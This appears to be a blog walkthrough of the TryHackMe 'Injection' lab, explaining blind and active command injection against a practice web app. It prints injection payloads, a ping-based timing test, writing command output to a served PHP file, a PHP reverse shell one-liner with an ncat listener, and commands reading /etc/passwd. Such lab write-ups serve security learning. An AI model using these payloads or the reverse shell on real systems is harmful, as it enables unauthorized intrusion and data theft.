---
layout: post
title: Injection – Try Hack Me
subtitle: Walkthrough
tags: [Command,Injection,Webapp]
---

In this box you will learn about command injection from a blind and active perspective.

[Challenge](https://tryhackme.com/room/injection)

## Task 1

Initiate the VPN connection and deploy the machine


Add the IP address of our machine to the /etc/hosts

~~~
echo 10.10.45.107 injection >> /etc/hosts
~~~

## Task 2 → An Introduction To Command Injection

Head over to http://injection/ and mess around with the web application.
Here are some common command injection payloads try them out.

~~~
; ls
&& ls
| ls
|| ls 
~~~

## Task 3 → Blind Command Injection

From the previous task you might have noticed that when you supply an existing user concatenated with a command injection payload we get a successful response. 
Such as:
~~~
root; ls
~~~

![root;ls](/img/2020-07-24-Injection/root-ls.png)

Since we don't see any output, we might think that there is a blind command injection. To check this, let's ping the machine and see if the responses is delayed.

~~~
root & ping -c 10 <Machine-IP>
~~~

Since the response takes a while, it's a good indication that our assumption was correct.
Let's try to view the response. We can try to redirect the output of a command to a file. Let's try 'index.php'.

~~~
root;uname -r > tmp.php
~~~
Heading over to 'http://injection/tmp.php' we can see the output of our payload.

![uname](/img/2020-07-24-Injection/uname.png)

Next, enter the username asked in the web application and check the message displayed. 
By now you probably noticed that an existing username will display 'Success' on the other hand a user that does not exits will display 'Error'.

## Task 4 → Active Command Injection

In this task we are given an interactive shell. Head over to 'http://injection/evilshell.php'.
Run the 'ls' command to see the content of the current directory.

![ls](/img/2020-07-24-Injection/ls.png)

For the rest of this box, let's get a reverse shell, in order to easily interpret the output.
On your machine run:

~~~
ncat -l -p 1337
~~~

On our interactive shell execute: 10.9.2.107
~~~
php -r '$sock=fsockopen("<Your_IP>",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
~~~
You can find your IP on this link https://tryhackme.com/access or run 'ifconfig' and check the IP on the tun0 interface.

The answer to the next questions can be found be running the following commands.

~~~
#2 cat /etc/passwd
#3 whoami
#4 cat /etc/passwd | grep www-data
#5 lsb_release -a
#6 cat /etc/update-motd.d/00-header
~~~

## Task 5 → Get The Flag!

Usually the name of the flag file is 'flag.txt', so let's search for it.

~~~
find / -name flag.txt 2>/dev/null 
~~~
Simply use cat and you are done.
Hope you enjoyed this guide.

